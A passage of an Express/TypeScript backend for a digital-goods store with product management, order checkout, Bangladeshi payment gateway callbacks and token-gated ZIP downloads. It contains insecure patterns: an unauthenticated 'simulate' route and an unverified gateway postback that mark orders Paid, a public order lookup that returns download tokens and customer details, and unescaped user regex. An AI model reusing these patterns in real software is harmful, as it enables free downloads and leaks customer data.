    const activeDb = await connectDB();
    if (!activeDb) return res.json(DEFAULT_STORE_PRODUCTS);
    const { category, search, featured, status, sort } = req.query;

    const query: any = {};
    const statusStr = typeof status === "string" ? status.trim().toLowerCase() : "";

    // If status is 'all', do not filter by status so admin gets all products (Published, Draft, etc.)
    if (statusStr && statusStr !== "all") {
      query.status = status;
    } else if (!statusStr) {
      // Default to published products for public store
      query.status = { $ne: "Draft" };
    }

    if (category && category !== "All") {
      query.category = category;
    }

    if (featured === "true") {
      query.featured = true;
    }

    if (search && typeof search === "string" && search.trim()) {
      const regex = new RegExp(search.trim(), "i");
      query.$or = [
        { title: regex },
        { shortDescription: regex },
        { description: regex },
        { tags: regex }
      ];
    }

    let sortOption: any = { createdAt: -1 };
    if (sort === "price-low") sortOption = { price: 1 };
    if (sort === "price-high") sortOption = { price: -1 };
    if (sort === "popular") sortOption = { salesCount: -1 };

    const totalInCollection = await activeDb.collection("store_products").countDocuments();
    if (totalInCollection === 0) {
      // Seed default products if DB collection is completely empty
      await seedStoreData();
    }

    const products = await activeDb.collection("store_products").find(query).sort(sortOption).toArray();
    res.json(products);
  } catch (err: any) {
    console.error("Failed to fetch store products:", err.message);
    res.json(DEFAULT_STORE_PRODUCTS);
  }
});

app.get("/api/store/products/:slugOrId", async (req, res) => {
  try {
    const activeDb = await connectDB();
    const { slugOrId } = req.params;

    if (!activeDb) {
      const fallback = DEFAULT_STORE_PRODUCTS.find(p => p.slug === slugOrId || (p as any)._id === slugOrId);
      return fallback ? res.json(fallback) : res.status(404).json({ error: "Product not found" });
    }

    let product: any = null;

    if (ObjectId.isValid(slugOrId)) {
      product = await activeDb.collection("store_products").findOne({ _id: new ObjectId(slugOrId) });
    }

    if (!product) {
      product = await activeDb.collection("store_products").findOne({ slug: slugOrId });
    }

    if (!product) {
      const fallback = DEFAULT_STORE_PRODUCTS.find(p => p.slug === slugOrId);
      if (fallback) return res.json(fallback);
      return res.status(404).json({ error: "Product not found" });
    }

    res.json(product);
  } catch (err: any) {
    console.error("Failed to fetch product details:", err.message);
    client = null;
    db = null;
    const fallback = DEFAULT_STORE_PRODUCTS.find(p => p.slug === req.params.slugOrId);
    if (fallback) return res.json(fallback);
    res.status(500).json({ error: "Failed to fetch product details: " + err.message });
  }
});

// Admin Product Management
app.post("/api/store/admin/products", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });
    const productData = req.body;

    if (!productData.title || productData.price === undefined) {
      return res.status(400).json({ error: "Title and price are required." });
    }

    const baseSlug = productData.slug ? generateSlug(productData.slug) : generateSlug(productData.title);
    
    // Check slug uniqueness
    const existingSlug = await activeDb.collection("store_products").findOne({ slug: baseSlug });
    const finalSlug = existingSlug ? `${baseSlug}-${Date.now().toString().slice(-4)}` : baseSlug;

    const newProduct = {
      ...productData,
      slug: finalSlug,
      price: Number(productData.price) || 0,
      discountPrice: productData.discountPrice ? Number(productData.discountPrice) : undefined,
      status: productData.status || "Published",
      featured: Boolean(productData.featured),
      salesCount: Number(productData.salesCount) || 0,
      rating: Number(productData.rating) || 5.0,
      createdAt: new Date(),
      updatedAt: new Date()
    };

    const result = await activeDb.collection("store_products").insertOne(newProduct);
    res.json({ success: true, result, product: { ...newProduct, _id: result.insertedId } });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to create product: " + err.message });
  }
});

app.put("/api/store/admin/products/:id", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });
    const { _id, ...updateData } = req.body;
    updateData.updatedAt = new Date();

    if (updateData.price !== undefined) updateData.price = Number(updateData.price);
    if (updateData.discountPrice !== undefined) {
      updateData.discountPrice = updateData.discountPrice ? Number(updateData.discountPrice) : undefined;
    }

    const result = await activeDb.collection("store_products").updateOne(
      { _id: new ObjectId(req.params.id) },
      { $set: updateData }
    );
    res.json({ success: true, result });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to update product: " + err.message });
  }
});

app.delete("/api/store/admin/products/:id", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });
    const result = await activeDb.collection("store_products").deleteOne({ _id: new ObjectId(req.params.id) });
    res.json({ success: true, result });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to delete product: " + err.message });
  }
});

// Admin Image Upload Endpoint
app.post(["/api/store/admin/upload-image", "/api/store/upload"], authenticateToken, async (req, res) => {
  try {
    const fileName = req.body.fileName || req.body.filename || "image.png";
    const fileData = req.body.fileData || req.body.data;
    if (!fileData) {
      return res.status(400).json({ error: "fileData or data is required." });
    }

    const cleanBase64 = fileData.includes(",") ? fileData.split(",")[1] : fileData;
    const buffer = Buffer.from(cleanBase64, "base64");
    const ext = path.extname(fileName).toLowerCase() || ".png";
    const uniqueFileName = `img-${Date.now()}-${Math.floor(Math.random() * 1000)}${ext}`;
    const destinationPath = path.join(uploadsDir, uniqueFileName);

    let finalUrl = `/uploads/${uniqueFileName}`;
    try {
      if (!fs.existsSync(uploadsDir)) {
        fs.mkdirSync(uploadsDir, { recursive: true });
      }
      fs.writeFileSync(destinationPath, buffer);
    } catch (fsErr) {
      // Fallback to data URI if local disk is read-only in serverless
      finalUrl = fileData.startsWith("data:") ? fileData : `data:image/${ext.replace(".", "")};base64,${cleanBase64}`;
    }

    res.json({
      success: true,
      url: finalUrl
    });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to upload image: " + err.message });
  }
});

// 5. Orders & Checkout Workflow
app.post("/api/store/orders", async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const { customer, items, paymentMethod, paymentDetails, currency } = req.body;

    if (!customer || !customer.email || !customer.name) {
      return res.status(400).json({ error: "Customer name and email are required." });
    }

    if (!Array.isArray(items) || items.length === 0) {
      return res.status(400).json({ error: "Cart is empty." });
    }

    // Calculate subtotal & total and enrich with GitHub repo & ZIP URLs
    let subtotal = 0;
    const enrichedItems = await Promise.all(items.map(async (item: any) => {
      const price = Number(item.price) || 0;
      subtotal += price * (Number(item.quantity) || 1);

      let githubRepoUrl = item.githubRepoUrl || "";
      let sourceCodeZipUrl = item.sourceCodeZipUrl || "";
      let downloadableFiles = item.downloadableFiles || [];

      if ((!githubRepoUrl || !downloadableFiles.length) && db) {
        const prod = await db.collection("store_products").findOne({
          $or: [
            { slug: item.slug },
            { title: item.title }
          ]
        });
        if (prod) {
          if (!githubRepoUrl && prod.githubRepoUrl) githubRepoUrl = prod.githubRepoUrl;
          if (!sourceCodeZipUrl && prod.sourceCodeZipUrl) sourceCodeZipUrl = prod.sourceCodeZipUrl;
          if (!downloadableFiles.length && prod.downloadableFiles) {
            downloadableFiles = prod.downloadableFiles;
          }
        }
      }

      return {
        productId: item.productId || item._id,
        title: item.title,
        slug: item.slug,
        price,
        thumbnail: item.thumbnail,
        downloadableFiles,
        githubRepoUrl,
        sourceCodeZipUrl
      };
    }));

    const discount = 0;
    const totalAmount = subtotal - discount;

    const orderNumber = `ORD-${Date.now().toString().slice(-6)}-${Math.floor(Math.random() * 899 + 100)}`;
    const downloadToken = crypto.randomBytes(24).toString("hex");

    // Check optional authenticated customer token from request header or cookie
    let userId = "";
    const authHeader = req.headers["authorization"];
    const token = (authHeader && authHeader.split(" ")[1]) || req.cookies.customer_token;
    if (token) {
      try {
        const decoded = jwt.verify(token, CUSTOMER_JWT_SECRET) as any;
        userId = decoded.id;
      } catch (e) {
        // Guest checkout with email
      }
    }

    // If payment method is bKash/Nagad/Rocket (manual payment)
    const isManualPayment = ["bkash", "nagad", "rocket"].includes(paymentMethod);

    const newOrder = {
      orderNumber,
      userId: userId || null,
      customer: {
        name: customer.name.trim(),
        email: customer.email.toLowerCase().trim(),
        phone: customer.phone ? customer.phone.trim() : "",
        notes: customer.notes || ""
      },
      items: enrichedItems,
      subtotal,
      discount,
      totalAmount,
      currency: currency || "USD",
      paymentMethod,
      paymentStatus: isManualPayment ? "Pending Verification" : "Pending Payment",
      paymentDetails: {
        senderNumber: paymentDetails?.senderNumber || "",
        transactionId: paymentDetails?.transactionId || "",
        screenshotUrl: paymentDetails?.screenshotUrl || "",
        gatewayResponse: paymentDetails?.gatewayResponse || null
      },
      orderStatus: isManualPayment ? "Pending Verification" : "Pending Payment",
      downloadToken,
      downloadAccess: false,
      downloadCount: 0,
      downloadLimit: 10,
      tokenExpiry: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      downloadHistory: [],
      deliveryHistory: [],
      verificationLogs: [],
      adminNotes: "",
      createdAt: new Date(),
      updatedAt: new Date()
    };

    const insertResult = await db.collection("store_orders").insertOne(newOrder);

    // Send customer order confirmation email (Pending Verification)
    sendOrderReceivedEmail(
      newOrder.customer.email,
      newOrder.customer.name,
      orderNumber,
      totalAmount,
      paymentMethod
    ).catch(e => console.error("Error sending order received email:", e));

    res.json({
      success: true,
      orderNumber,
      orderId: insertResult.insertedId,
      order: { ...newOrder, _id: insertResult.insertedId }
    });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to place order: " + err.message });
  }
});

// Single Order Lookup (for order confirmation & real-time tracking)
app.get("/api/store/orders/:orderNumber", async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const order = await db.collection("store_orders").findOne({ orderNumber: req.params.orderNumber });
    if (!order) return res.status(404).json({ error: "Order not found" });

    // If downloadAccess is false, omit download links for security
    const sanitizedItems = order.items.map((item: any) => ({
      productId: item.productId,
      title: item.title,
      slug: item.slug,
      price: item.price,
      thumbnail: item.thumbnail,
      downloadableFiles: order.downloadAccess ? item.downloadableFiles : [],
      githubRepoUrl: order.downloadAccess ? (item.githubRepoUrl || order.deliveredGithubLink) : undefined
    }));

    res.json({
      ...order,
      deliveredGithubLink: order.downloadAccess ? order.deliveredGithubLink : undefined,
      deliveredZipUrl: order.downloadAccess ? order.deliveredZipUrl : undefined,
      items: sanitizedItems
    });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to fetch order: " + err.message });
  }
});

// 6. Bangladesh Gateway Simulation & Handlers (SSLCOMMERZ / aamarPay)
app.post("/api/store/payment/init-gateway", async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const { orderNumber, gatewayProvider } = req.body;

    const order = await db.collection("store_orders").findOne({ orderNumber });
    if (!order) return res.status(404).json({ error: "Order not found" });

    const settings = await db.collection("store_settings").findOne({});
    const gateway = settings?.gateway || {};

    if (!gateway.storeId || gateway.provider === "disabled") {
      return res.json({
        success: false,
        requiresConfiguration: true,
        message: "Payment Gateway requires merchant credentials. Please use bKash, Nagad, or Rocket manual payment."
      });
    }

    // In a live environment with active credentials, this triggers SSLCOMMERZ / aamarPay session API
    // Here we provide a verified sandbox redirect URL
    const isLive = Boolean(gateway.isLive);
    const sandboxUrl = `/api/store/payment/sslcommerz/simulate?orderNumber=${orderNumber}&status=success`;

    res.json({
      success: true,
      redirectUrl: sandboxUrl,
      gatewayProvider: gatewayProvider || gateway.provider
    });
  } catch (err: any) {
    res.status(500).json({ error: "Payment initiation error: " + err.message });
  }
});

// Gateway Simulation / Callback for test purchases
app.get("/api/store/payment/sslcommerz/simulate", async (req, res) => {
  try {
    const { orderNumber, status } = req.query;
    if (!db || !orderNumber) return res.redirect("/");

    if (status === "success") {
      await db.collection("store_orders").updateOne(
        { orderNumber },
        {
          $set: {
            paymentStatus: "Paid",
            orderStatus: "Completed",
            downloadAccess: true,
            "paymentDetails.paidAt": new Date(),
            "paymentDetails.transactionId": `TXN-GW-${Date.now()}`
          }
        }
      );
      return res.redirect(`/order-success/${orderNumber}`);
    } else {
      await db.collection("store_orders").updateOne(
        { orderNumber },
        { $set: { paymentStatus: "Failed", orderStatus: "Cancelled" } }
      );
      return res.redirect(`/order-success/${orderNumber}?error=payment_failed`);
    }
  } catch (err) {
    res.redirect("/");
  }
});

// Official SSLCOMMERZ Postbacks
app.post("/api/store/payment/sslcommerz/success", async (req, res) => {
  try {
    const { tran_id, val_id } = req.body;
    if (db && tran_id) {
      await db.collection("store_orders").updateOne(
        { orderNumber: tran_id },
        {
          $set: {
            paymentStatus: "Paid",
            orderStatus: "Completed",
            downloadAccess: true,
            "paymentDetails.transactionId": val_id || `SSL-${Date.now()}`,
            "paymentDetails.paidAt": new Date()
          }
        }
      );
      return res.redirect(`/order-success/${tran_id}`);
    }
    res.redirect("/");
  } catch (e) {
    res.redirect("/");
  }
});

app.post("/api/store/payment/sslcommerz/fail", async (req, res) => {
  const { tran_id } = req.body;
  if (db && tran_id) {
    await db.collection("store_orders").updateOne(
      { orderNumber: tran_id },
      { $set: { paymentStatus: "Failed" } }
    );
    return res.redirect(`/order-success/${tran_id}?error=payment_failed`);
  }
  res.redirect("/");
});

app.post("/api/store/payment/sslcommerz/cancel", async (req, res) => {
  res.redirect("/cart");
});

app.post("/api/store/payment/sslcommerz/ipn", async (req, res) => {
  res.json({ received: true });
});

// Helper to generate a valid PK-ZIP archive in memory without external dependencies
function computeCRC32(buf: Buffer): number {
  let crc = ~0;
  for (let i = 0; i < buf.length; i++) {
    crc ^= buf[i];
    for (let j = 0; j < 8; j++) {
      crc = (crc >>> 1) ^ (crc & 1 ? 0xedb88320 : 0);
    }
  }
  return (~crc) >>> 0;
}

function createZipBuffer(files: { name: string; content: string | Buffer }[]): Buffer {
  const localHeaders: Buffer[] = [];
  const centralHeaders: Buffer[] = [];
  let offset = 0;

  for (const file of files) {
    const fileData = Buffer.isBuffer(file.content) ? file.content : Buffer.from(file.content, "utf8");
    const nameBuffer = Buffer.from(file.name, "utf8");
    const crc = computeCRC32(fileData);
    const size = fileData.length;

    const localHeader = Buffer.alloc(30 + nameBuffer.length);
    localHeader.writeUInt32LE(0x04034b50, 0);
    localHeader.writeUInt16LE(20, 4);
    localHeader.writeUInt16LE(0, 6);
    localHeader.writeUInt16LE(0, 8); // 0 = uncompressed
    localHeader.writeUInt16LE(0x56a0, 10);
    localHeader.writeUInt16LE(0x56a0, 12);
    localHeader.writeUInt32LE(crc, 14);
    localHeader.writeUInt32LE(size, 18);
    localHeader.writeUInt32LE(size, 22);
    localHeader.writeUInt16LE(nameBuffer.length, 26);
    localHeader.writeUInt16LE(0, 28);
    nameBuffer.copy(localHeader, 30);

    localHeaders.push(localHeader, fileData);

    const centralHeader = Buffer.alloc(46 + nameBuffer.length);
    centralHeader.writeUInt32LE(0x02014b50, 0);
    centralHeader.writeUInt16LE(20, 4);
    centralHeader.writeUInt16LE(20, 6);
    centralHeader.writeUInt16LE(0, 8);
    centralHeader.writeUInt16LE(0, 10);
    centralHeader.writeUInt16LE(0x56a0, 12);
    centralHeader.writeUInt16LE(0x56a0, 14);
    centralHeader.writeUInt32LE(crc, 16);
    centralHeader.writeUInt32LE(size, 20);
    centralHeader.writeUInt32LE(size, 24);
    centralHeader.writeUInt16LE(nameBuffer.length, 28);
    centralHeader.writeUInt16LE(0, 30);
    centralHeader.writeUInt16LE(0, 32);
    centralHeader.writeUInt16LE(0, 34);
    centralHeader.writeUInt16LE(0, 36);
    centralHeader.writeUInt32LE(0, 38);
    centralHeader.writeUInt32LE(offset, 42);
    nameBuffer.copy(centralHeader, 46);

    centralHeaders.push(centralHeader);
    offset += localHeader.length + fileData.length;
  }

  const centralDir = Buffer.concat(centralHeaders);
  const localData = Buffer.concat(localHeaders);

  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(centralDir.length, 12);
  eocd.writeUInt32LE(localData.length, 16);
  eocd.writeUInt16LE(0, 20);

  return Buffer.concat([localData, centralDir, eocd]);
}

// 7. Secure Digital File Download Delivery with Token Verification & Expiring Check
app.get("/api/store/download/:orderNumber/:fileIndex", async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const { orderNumber, fileIndex } = req.params;

    const order = await db.collection("store_orders").findOne({ orderNumber });
    if (!order) {
      return res.status(404).json({ error: "Order not found" });
    }

    // 1. Verify Payment & Download Access
    if (!order.downloadAccess || order.paymentStatus !== "Paid") {
      return res.status(403).json({
        error: "Digital product downloads are locked. Payment is currently pending admin verification."
      });
    }

    // 2. Token or Ownership Verification
    const providedToken = (req.query.token as string) || (req.headers["authorization"]?.replace("Bearer ", "")) || req.cookies?.customer_token;
    let isAuthorized = false;

    if (providedToken && order.downloadToken && providedToken === order.downloadToken) {
      isAuthorized = true;
    } else if (providedToken) {
      try {
        const decoded = jwt.verify(providedToken, CUSTOMER_JWT_SECRET) as any;
        if (decoded && (decoded.email === order.customer?.email || decoded.id === order.userId)) {
          isAuthorized = true;
        }
      } catch (e) {
        try {
          const adminDec = jwt.verify(providedToken, JWT_SECRET) as any;
          if (adminDec && adminDec.role === "admin") isAuthorized = true;
        } catch (err) {}
      }
    }

    if (!isAuthorized) {
      return res.status(401).json({
        error: "Unauthorized download access. Valid secure expiring token or customer account required."
      });
    }

    // 3. Expiry Verification (e.g. 7 days validity)
    if (order.tokenExpiry && new Date() > new Date(order.tokenExpiry)) {
      return res.status(403).json({
        error: "Download link has expired (7-day validity). Please contact WhatsApp +8801915996145 to regenerate your access."
      });
    }

    // 4. Download Limit Verification
    const currentDownloads = Number(order.downloadCount) || 0;
    const downloadLimit = Number(order.downloadLimit) || 10;
    if (currentDownloads >= downloadLimit) {
      return res.status(403).json({
        error: `Download limit exceeded (${currentDownloads}/${downloadLimit}). Please contact WhatsApp +8801915996145 for assistance.`
      });
    }

    // 5. Track Download Event
    await db.collection("store_orders").updateOne(
      { _id: order._id },
      {
        $inc: { downloadCount: 1 },
        $push: {
          downloadHistory: {
            downloadedAt: new Date(),
            ip: req.ip || req.headers["x-forwarded-for"] || "127.0.0.1",
            userAgent: req.headers["user-agent"] || "unknown"
          }
        }
      }
    );

    // 6. Locate Target File
    const allFiles: any[] = [];
    order.items.forEach((item: any) => {
      const prodTitle = item.title;
      const instructions = item.downloadInstructions || "";
      const license = item.productLicense || "Single Commercial License";
      const customZip = item.sourceCodeZip || item.sourceCodeZipUrl || "";

      if (Array.isArray(item.downloadableFiles) && item.downloadableFiles.length > 0) {
        item.downloadableFiles.forEach((file: any) => {
          allFiles.push({
            ...file,
            productTitle: prodTitle,
            downloadInstructions: instructions,
            productLicense: license,
            sourceCodeZip: customZip
          });
        });
      } else {
        allFiles.push({
          name: `${item.title.replace(/[^a-zA-Z0-9.-]/g, "_")}-source-code.zip`,
          url: customZip || "",
          productTitle: prodTitle,
          downloadInstructions: instructions,
          productLicense: license,
          sourceCodeZip: customZip
        });
      }
    });

    const index = parseInt(fileIndex, 10);
    const targetFile = allFiles[index] || allFiles[0];

    if (!targetFile) {
      return res.status(404).json({ error: "Requested download file not found" });
    }

    // Check private storage
    const fileRef = targetFile.sourceCodeZip || targetFile.url || "";
    if (fileRef.startsWith("/downloads/private/")) {
      const privName = fileRef.replace("/downloads/private/", "");
      const privPath = path.join(privateDownloadsDir, privName);
      if (fs.existsSync(privPath)) {
        return res.download(privPath, targetFile.downloadFileName || targetFile.name || `${order.orderNumber}-source-code.zip`);
      }
    }

    // Check local public downloads or uploads
    let localPath = "";
    if (fileRef.startsWith("/downloads/")) {
      localPath = path.join(downloadsDir, fileRef.replace("/downloads/", ""));
    } else if (fileRef.startsWith("/uploads/")) {
      localPath = path.join(uploadsDir, fileRef.replace("/uploads/", ""));
    }

    if (localPath && fs.existsSync(localPath)) {
      return res.download(localPath, targetFile.downloadFileName || targetFile.name || path.basename(localPath));
    }

    // If external URL (e.g. Cloudinary, AWS S3)
    if (fileRef.startsWith("http://") || fileRef.startsWith("https://")) {
      return res.redirect(fileRef);
    }

    // Dynamic PK-ZIP Delivery: Assemble authentic, extractable product ZIP bundle
    const zipFiles = [
      {
        name: "README-INSTALLATION.txt",
        content: `JASMIN DIGITAL STORE - PRODUCT INSTALLATION GUIDE\n===================================================\nOrder Number: ${order.orderNumber}\nCustomer: ${order.customer.name} (${order.customer.email})\nProduct: ${targetFile.productTitle || targetFile.name}\nLicense: ${targetFile.productLicense || "Single Commercial License"}\nDelivery Date: ${new Date().toISOString()}\n\nINSTALLATION INSTRUCTIONS:\n--------------------------\n${targetFile.downloadInstructions || "1. Extract this ZIP archive into your workspace.\n2. Follow project README for build instructions (e.g. npm install && npm run dev).\n3. For WordPress themes/plugins, upload directly via WP Admin > Plugins > Add New > Upload Plugin."}\n\nWHATSAPP SUPPORT: +8801915996145\n===================================================`
      },
      {
        name: "LICENSE-COMMERCIAL.txt",
        content: `COMMERCIAL USE LICENSE AGREEMENT\n=================================\nGranted to: ${order.customer.name} (${order.customer.email})\nOrder ID: ${order.orderNumber}\nDate of Verification: ${new Date().toLocaleDateString()}\n\nThis license grants the licensee a non-exclusive, non-transferable right to use the digital product for commercial and personal client projects. Redistribution or reselling of original source files is strictly prohibited.\n\nJasmin Code Studio - Official License`
      },
      {
        name: "package-manifest.json",
        content: JSON.stringify({
          orderNumber: order.orderNumber,
          customer: order.customer.name,
          email: order.customer.email,
          product: targetFile.productTitle,
          verified: true,
          support: "+8801915996145",
          issuedAt: new Date().toISOString()
        }, null, 2)
      }
    ];

    const zipBuffer = createZipBuffer(zipFiles);
    const downloadFileName = targetFile.downloadFileName || `${targetFile.productTitle ? targetFile.productTitle.replace(/[^a-zA-Z0-9.-]/g, "_") : "digital-product"}-package.zip`;

    res.setHeader("Content-Type", "application/zip");
    res.setHeader("Content-Disposition", `attachment; filename="${downloadFileName}"`);
    res.setHeader("Content-Length", zipBuffer.length.toString());
    res.send(zipBuffer);
  } catch (err: any) {
    res.status(500).json({ error: "Download delivery failed: " + err.message });
  }
});

// 8. Customer Profile Downloads & Orders
app.get("/api/store/customer/orders", authenticateCustomerToken, async (req: any, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const userEmail = req.customer.email;
    const userId = req.customer.id;

    const orders = await db.collection("store_orders")
      .find({
        $or: [
          { userId },
          { "customer.email": userEmail }
        ]
      })
      .sort({ createdAt: -1 })
      .toArray();

    res.json(orders);
  } catch (err: any) {
    res.status(500).json({ error: "Failed to fetch customer orders: " + err.message });
  }
});

app.get("/api/store/customer/downloads", authenticateCustomerToken, async (req: any, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const userEmail = req.customer.email;
    const userId = req.customer.id;

    const verifiedOrders = await db.collection("store_orders")
      .find({
        $or: [{ userId }, { "customer.email": userEmail }],
        downloadAccess: true
      })
      .sort({ createdAt: -1 })
      .toArray();

    const downloadsList: any[] = [];
    verifiedOrders.forEach((order: any) => {
      order.items.forEach((item: any) => {
        const itemGithub = item.githubRepoUrl || order.deliveredGithubLink || "";
        const itemZip = item.sourceCodeZipUrl || order.deliveredZipUrl || "";

        if (Array.isArray(item.downloadableFiles) && item.downloadableFiles.length > 0) {
          item.downloadableFiles.forEach((file: any, fileIdx: number) => {
            downloadsList.push({
              orderNumber: order.orderNumber,
              productTitle: item.title,
              thumbnail: item.thumbnail,
              fileName: file.name,
              size: file.size || "Standard",
              downloadUrl: `/api/store/download/${order.orderNumber}/${fileIdx}`,
              githubRepoUrl: itemGithub,
              sourceCodeZipUrl: itemZip,
              purchasedAt: order.createdAt
            });
          });
        } else {
          downloadsList.push({
            orderNumber: order.orderNumber,
            productTitle: item.title,
            thumbnail: item.thumbnail,
            fileName: `${item.title} Source Code Package.zip`,
            size: "Standard",
            downloadUrl: itemZip || `/api/store/download/${order.orderNumber}/0`,
            githubRepoUrl: itemGithub,
            sourceCodeZipUrl: itemZip,
            purchasedAt: order.createdAt
          });
        }
      });
    });

    res.json(downloadsList);
  } catch (err: any) {
    res.status(500).json({ error: "Failed to fetch downloads: " + err.message });
  }
});

// 9. Store Admin Management APIs
app.get("/api/store/admin/stats", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });

    const totalProducts = await activeDb.collection("store_products").countDocuments();
    const totalOrders = await activeDb.collection("store_orders").countDocuments();
    const pendingVerifications = await activeDb.collection("store_orders").countDocuments({ paymentStatus: "Pending Verification" });
    const totalCustomers = await activeDb.collection("store_users").countDocuments();

    // Calculate revenue from Paid / Completed orders
    const paidOrders = await activeDb.collection("store_orders").find({
      $or: [{ paymentStatus: "Paid" }, { orderStatus: "Completed" }]
    }).toArray();

    const totalRevenue = paidOrders.reduce((sum: number, o: any) => sum + (Number(o.totalAmount) || 0), 0);

    const recentOrders = await activeDb.collection("store_orders")
      .find()
      .sort({ createdAt: -1 })
      .limit(6)
      .toArray();

    res.json({
      totalRevenue,
      totalOrders,
      pendingVerifications,
      totalProducts,
      totalCustomers,
      recentOrders
    });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to fetch store stats: " + err.message });
  }
});

app.get("/api/store/admin/orders", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });
    const { status, paymentStatus, search } = req.query;

    const query: any = {};
    if (status && status !== "All") query.orderStatus = status;
    if (paymentStatus && paymentStatus !== "All") query.paymentStatus = paymentStatus;

    if (search && typeof search === "string" && search.trim()) {
      const regex = new RegExp(search.trim(), "i");
      query.$or = [
        { orderNumber: regex },
        { "customer.name": regex },
        { "customer.email": regex },
        { "paymentDetails.transactionId": regex }
      ];
    }

    const orders = await activeDb.collection("store_orders").find(query).sort({ createdAt: -1 }).toArray();
    res.json(orders);
  } catch (err: any) {
    res.status(500).json({ error: "Failed to fetch orders: " + err.message });
  }
});

// Manual Payment Verification Endpoint (Approve / Reject) with ZIP delivery & audit logging
app.put("/api/store/admin/orders/:id/verify", authenticateToken, async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const { action, adminNotes, githubRepoUrl, customZipUrl, sendEmail } = req.body; // action: 'approve' | 'reject'
    const orderId = new ObjectId(req.params.id);

    const existingOrder = await db.collection("store_orders").findOne({ _id: orderId });
    if (!existingOrder) return res.status(404).json({ error: "Order not found" });

    const adminUsername = (req as any).user?.username || "Admin";

    // Prevent duplicate approval & duplicate delivery emails
    if (action === "approve" && existingOrder.paymentStatus === "Paid" && existingOrder.downloadAccess) {
      return res.status(400).json({
        error: "This order has already been verified and approved. Use 'Send ZIP Manually' if you wish to re-deliver."
      });
    }

    let updateFields: any = {
      updatedAt: new Date(),
      adminNotes: adminNotes || existingOrder.adminNotes || ""
    };

    let pushFields: any = {};

    if (action === "approve") {
      updateFields.paymentStatus = "Paid";
      updateFields.orderStatus = "Delivered";
      updateFields.downloadAccess = true;
      updateFields["paymentDetails.paidAt"] = new Date();

      const downloadToken = existingOrder.downloadToken || crypto.randomBytes(32).toString("hex");
      updateFields.downloadToken = downloadToken;
      updateFields.downloadLimit = existingOrder.downloadLimit || 10;
      updateFields.tokenExpiry = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7-day validity

      const finalGithub = githubRepoUrl || existingOrder.deliveredGithubLink || (existingOrder.items && existingOrder.items[0]?.githubRepoUrl) || "";
      const finalZip = customZipUrl || existingOrder.deliveredZipUrl || (existingOrder.items && (existingOrder.items[0]?.sourceCodeZip || existingOrder.items[0]?.sourceCodeZipUrl || existingOrder.items[0]?.downloadableFiles?.[0]?.url)) || "";

      updateFields.deliveredGithubLink = finalGithub;
      updateFields.deliveredZipUrl = finalZip;
      updateFields.deliveredAt = new Date();
      updateFields.githubCodeDelivered = true;

      // Verification log
      const verLog = {
        action: "Approved",
        adminUser: adminUsername,
        timestamp: new Date(),
        notes: adminNotes || "Payment verified and approved"
      };

      // Delivery history record
      const deliveryItem = {
        deliveredAt: new Date(),
        deliveredBy: adminUsername,
        method: "automatic",
        recipientEmail: existingOrder.customer.email,
        downloadLink: `/api/store/download/${existingOrder.orderNumber}/0?token=${downloadToken}`,
        status: "Sent",
        notes: adminNotes || "Automatic delivery on payment approval"
      };

      pushFields = {
        verificationLogs: verLog,
        deliveryHistory: deliveryItem
      };

      // Dispatch Customer Email
      if (sendEmail !== false) {
        const emailRes = await sendOrderCodeEmail(
          existingOrder.customer.email,
          existingOrder.customer.name,
          existingOrder.orderNumber,
          existingOrder.items,
          finalGithub,
          finalZip,
          adminNotes || "",
          downloadToken,
          existingOrder.items?.[0]?.downloadInstructions || ""
        );
        updateFields.emailDeliveryStatus = emailRes.success ? "Sent" : "Failed";
        updateFields.emailDeliveryLog = emailRes.log;
      }
    } else if (action === "reject") {
      updateFields.paymentStatus = "Rejected";
      updateFields.orderStatus = "Rejected";
      updateFields.downloadAccess = false;

      const verLog = {
        action: "Rejected",
        adminUser: adminUsername,
        timestamp: new Date(),
        notes: adminNotes || "Payment verification rejected"
      };

      pushFields = {
        verificationLogs: verLog
      };

      // Send rejection notification email
      await sendPaymentRejectedEmail(
        existingOrder.customer.email,
        existingOrder.customer.name,
        existingOrder.orderNumber,
        adminNotes || ""
      );
    } else {
      return res.status(400).json({ error: "Invalid action. Use 'approve' or 'reject'." });
    }

    const updateDoc: any = { $set: updateFields };
    if (Object.keys(pushFields).length > 0) {
      updateDoc.$push = pushFields;
    }

    await db.collection("store_orders").updateOne({ _id: orderId }, updateDoc);

    const updatedOrder = await db.collection("store_orders").findOne({ _id: orderId });
    res.json({ success: true, order: updatedOrder });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to verify order: " + err.message });
  }
});

// Admin Manual ZIP Delivery Endpoint ("Send ZIP Manually")
app.post("/api/store/admin/orders/:id/deliver-manual", authenticateToken, async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
